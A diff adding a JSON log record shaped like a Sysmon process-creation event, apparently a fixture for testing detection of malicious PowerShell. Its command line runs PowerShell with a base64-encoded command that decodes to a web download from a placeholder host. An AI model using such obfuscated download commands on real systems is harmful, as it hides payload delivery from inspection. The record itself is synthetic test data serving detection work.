@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-03 12:00:02.000",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBpAG4AdgBhAGwAaQBkAA==",
+  "User": "VICTIM-PC\\analyst"
+}
